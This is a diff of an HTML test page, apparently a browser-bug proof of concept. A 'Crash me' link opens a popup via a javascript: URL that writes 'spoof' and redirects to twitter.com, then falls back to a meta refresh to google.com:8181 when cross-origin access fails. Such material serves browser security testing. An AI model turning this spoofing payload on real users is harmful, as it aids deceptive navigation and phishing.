@@ -33,42 +33,31 @@ a.crash-link {
 
 </head>
 <body>
-
 <a href="#" class="crash-link" onclick="f(); return false;">Crash me</a>
 
 <script>
-let w = null;
-let watcher = null;
-
-function next() {
-
-  // insert meta refresh
-  var meta = document.createElement("meta");
-  meta.httpEquiv = "refresh";
-  meta.content = "0;url=https://google.com:8181";
-  document.head.appendChild(meta);
-
-}
-
 function f() {
 
-  w = window.open(
+  let w = window.open(
     "javascript:document.write('spoof');location='https://twitter.com'",
     "new",
     "width=500,height=500"
   );
 
-  if (watcher) {
-    clearInterval(watcher);
-  }
-
-  watcher = setInterval(function () {
+  let watcher = setInterval(function () {
 
     try {
       const x = w.location.href;
     } catch (e) {
+
       clearInterval(watcher);
-      next();
+
+      // meta refresh fallback
+      var meta = document.createElement("meta");
+      meta.httpEquiv = "refresh";
+      meta.content = "0;url=https://google.com:8181";
+      document.head.appendChild(meta);
+
     }
 
     if (!w || w.closed) {
@@ -76,6 +65,7 @@ function f() {
     }
 
   }, 100);
+
 }
 </script>
 
